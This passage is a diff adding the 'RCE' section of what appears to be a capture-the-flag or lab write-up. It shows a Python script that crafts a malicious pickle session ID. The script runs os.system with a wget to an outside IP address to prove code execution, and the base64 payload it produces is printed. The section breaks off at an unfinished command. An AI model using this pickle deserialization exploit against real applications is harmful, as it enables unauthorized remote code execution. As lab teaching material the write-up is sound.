@@ -346,5 +346,29 @@ So i can basically pass a command into my cookie and send a GET request to the s
 
 # RCE
 
+```python
+cat RCE.py          
+import pickle, base64, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("wget http://10.200.88.158/test.txt",))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)
+```
+
+Ill use this script to craft the malicious session ID
+
+```python
+python3 RCE.py           
+gAWVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJ3Z2V0IGh0dHA6Ly8xMC4yMDAuODguMTU4L3Rlc3QudHh0lIWUUpQu
+```
+
+Ill then run the script to make the session
+
+```python
+python3 -
+```
 
 
